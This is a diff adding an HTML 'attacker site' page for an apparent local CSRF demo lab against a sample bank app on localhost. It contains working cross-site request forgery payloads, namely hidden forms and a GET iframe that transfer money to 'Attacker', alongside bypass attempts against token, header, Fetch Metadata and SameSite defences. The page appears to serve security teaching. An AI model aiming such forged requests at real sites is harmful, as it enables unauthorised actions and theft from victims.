@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Attacker Dashboard</title>
+    <style>
+        body { font-family: 'Courier New', Courier, monospace; background-color: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }
+        .header { text-align: center; border-bottom: 1px solid #00ff00; padding-bottom: 20px; }
+        .grid { display: flex; gap: 20px; margin-top: 20px; }
+        .controls { flex: 1; display: flex; flex-direction: column; gap: 15px; }
+        .result-frame { flex: 1; border: 2px solid #00ff00; height: 600px; background: #fff; }
+        .attack-btn { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 15px; cursor: pointer; font-size: 1.1em; text-align: left; }
+        .attack-btn:hover { background: #00ff00; color: #000; }
+        .xss-link { color: #ff0000; word-break: break-all; }
+        .section { border: 1px dashed #00ff00; padding: 10px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>💀 ATTACKER SITE 💀</h1>
+        <p>Target: http://localhost:3000</p>
+    </div>
+
+    <div class="grid">
+        <div class="controls">
+            <h2>Select Attack Payload</h2>
+
+            <div class="section">
+                <h3>1. Vulnerable Endpoints (Will Succeed)</h3>
+                <button class="attack-btn" onclick="executeGetAttack()">💥 GET URL Injection (Image Tag)</button>
+                <form id="vulnerable-post-form" action="http://localhost:3000/transfer-vulnerable" method="POST" target="target-frame">
+                    <input type="hidden" name="amount" value="5000">
+                    <input type="hidden" name="to" value="Attacker">
+                    <button type="button" class="attack-btn" onclick="document.getElementById('vulnerable-post-form').submit()">💥 Standard Form CSRF (POST)</button>
+                </form>
+            </div>
+
+            <div class="section">
+                <h3>2. Protected Endpoints (Will Fail)</h3>
+                
+                <form id="token-fail-form" action="http://localhost:3000/transfer-token" method="POST" target="target-frame">
+                    <input type="hidden" name="amount" value="5000">
+                    <input type="hidden" name="to" value="Attacker">
+                    <input type="hidden" name="_csrf" value="invalid-fake-token-123">
+                    <button type="button" class="attack-btn" onclick="document.getElementById('token-fail-form').submit()">🛡️ Attempt bypass: Anti-CSRF Token</button>
+                </form>
+
+                <!-- Custom Header bypass attempt: Forms can't send custom headers, and fetch will be blocked by CORS unless allowed. -->
+                <button class="attack-btn" onclick="executeHeaderBypass()">🛡️ Attempt bypass: Custom Header</button>
+                
+                <form id="metadata-fail-form" action="http://localhost:3000/transfer-metadata" method="POST" target="target-frame">
+                    <input type="hidden" name="amount" value="5000">
+                    <input type="hidden" name="to" value="Attacker">
+                    <button type="button" class="attack-btn" onclick="document.getElementById('metadata-fail-form').submit()">🛡️ Attempt bypass: Fetch Metadata</button>
+                </form>
+
+                <form id="samesite-fail-form" action="http://localhost:3000/transfer-samesite" method="POST" target="target-frame">
+                    <input type="hidden" name="amount" value="5000">
+                    <input type="hidden" name="to" value="Attacker">
+                    <button type="button" class="attack-btn" onclick="document.getElementById('samesite-fail-form').submit()">🛡️ Attempt bypass: SameSite Cookie</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- The iframe where the victim's browser will execute the requests -->
+        <iframe name="target-frame" id="target-frame" class="result-frame"></iframe>
+    </div>
+
+    <!-- Hidden area for GET URL injection -->
+    <div id="hidden-area" style="display:none;"></div>
+
+    <script>
+        function executeGetAttack() {
+            // Just load it in the iframe so we can see the result directly
+            document.getElementById('target-frame').src = 'http://localhost:3000/transfer-get?amount=1000&to=Attacker_GET';
+        }
+
+        function executeHeaderBypass() {
+            // Attempting to bypass custom header.
+            // If we use fetch, it will trigger a CORS preflight. The bank app currently allows CORS from 4000 to show the error properly.
+            // But it doesn't allow the 'X-Requested-With' header in CORS!
+            fetch('http://localhost:3000/transfer-header', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'X-Requested-With': 'XMLHttpRequest' // Browser will block this due to CORS policy
+                },
+                body: new URLSearchParams({ amount: 5000, to: 'Attacker' })
+            }).then(res => res.text()).then(html => {
+                const iframe = document.getElementById('target-frame');
+                iframe.contentWindow.document.open();
+                iframe.contentWindow.document.write(html);
+                iframe.contentWindow.document.close();
+            }).catch(err => {
+                // Because CORS blocks the request, the browser won't even let us read the error response.
+                // It just throws a TypeError. We show an alert to the user.
+                alert("CORS Error: Browser blocked the custom header attack!\n\n" + err);
+            });
+        }
+    </script>
+</body>
+</html>
